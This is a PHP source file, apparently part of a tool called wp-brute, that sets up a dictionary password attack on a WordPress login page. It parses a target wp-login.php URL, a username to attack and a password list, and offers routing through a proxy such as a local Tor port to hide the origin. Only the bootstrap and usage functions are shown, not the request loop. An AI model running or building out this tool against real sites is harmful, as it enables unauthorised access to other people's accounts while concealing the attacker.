<?php

function wpbrute_bootstrap() {
	//Check for correct arguments and set up the global variables.
	
	global $wpbrute, $argc, $argv;
	
	if ( $argc < 4 ) {
		//Not enough valid arguments to continue.
		return false;
	}
	
	//Set the array values.
	$wpbrute['target_full_url'] = $argv[1];
	$wpbrute['target_username'] = $argv[2];
	$wpbrute['fp_passlist'] = $argv[3];
	
	//Check that each specified value is correct.
	
	//Check the URL and ensure it's pointing at wp-login.php
	if ( strpos("a".$wpbrute['target_full_url'],"http://") == 0  || strpos("a".$wpbrute['target_full_url'],"wp-login.php") == 0) {
		return false;
	}
	
	//Check to see the password list exists.
	if ( !file_exists($wpbrute['fp_passlist']) ) {
		wpbrute_die("FATAL: Couldn't find password list file at ".$wpbrute['fp_passlist']." - Check the file path and try again.\n");
	}
	
	//Everything looks good. Parse a few more neceesities and continue.
	$url_buffer = parse_url($wpbrute['target_full_url']);
	
	$wpbrute['target_host'] = $url_buffer['host'];
	$wpbrute['target_request'] = $url_buffer['path'];
	wpbrute_log("Resolving target '".$wpbrute['target_host']."' to IP to avoid repeated DNS queries.");
	$wpbrute['target_ip'] = gethostbyname($url_buffer['host']);
	wpbrute_log("Resolved target hostname to IP address ".$wpbrute['target_ip']);
	$wpbrute['target_wpadmin'] = str_replace("wp-login.php","wp-admin/",$wpbrute['target_full_url']);
	
	wpbrute_log("Reading password dictionary from ".$wpbrute['fp_passlist']);
	//Open the password list and read it into an array.
	$wpbrute['passlist_fh'] = fopen($wpbrute['fp_passlist'],'r');
	$wpbrute['passlist_raw'] = fread($wpbrute['passlist_fh'],filesize($wpbrute['fp_passlist']));
	fclose($wpbrute['passlist_fh']);
	
	//Explode each password into an array.
	$wpbrute['passlist_array'] = explode("\n",$wpbrute['passlist_raw']);
	$wpbrute['passlist_total'] = count($wpbrute['passlist_array']);
	$wpbrute['passlist_progress'] = 0;
	wpbrute_log("Found ".$wpbrute['passlist_total']." passwords to try from dictionary.");
	
	//Check for local / proxy usage.
	if ( $argc > 4 ) {
		if ( $argv[4] == "/proxy" ) {
			//Check for proxy defininition.
			if ( $argc > 5 ) {
				//Seems to be there.
				$proxy = explode(":",$argv[5]);
				if ( count($proxy) < 2) {
					wpbrute_die("FATAL: Proxy option specified with invalid proxy address or port.");
				}
				
				$wpbrute['proxy_ip'] = $proxy[0];
				$wpbrute['proxy_port'] = $proxy[1];
				
				if ($wpbrute['proxy_ip'] == null || $wpbrute['proxy_port'] == null) {
					wpbrute_die("FATAL: Proxy option specified with invalid proxy address or port.");
				}
				
				$wpbrute['proxy'] = true;
				
			} else {
				wpbrute_die("FATAL: Proxy option specified with no proxy address or port.");
			}
		} else {
			wpbrute_localwarn();
			$wpbrute['proxy'] = false;
		}
	} else {
		wpbrute_localwarn();
		$wpbrute['proxy'] = false;
	}
	
	wpbrute_log("Boostrap done.");
	
	return true;

}

function wpbrute_usage() {
	//Print the usage instructions on how to use wp-brute
	
	print("\nUsage: wp-brute.php wp-loginurl username passlist [[/proxy] 127.0.0.1:9050]\n\n");
	print("wp-loginurl: Full url pointing to target wp-login.php\n");
	print("username: The Wordpress username to attack\n");
	print("passlist: Location of password dictionary file\n");
	print("/proxy: Connect via proxy");
	print("\n\n");
	exit(1);
}

?>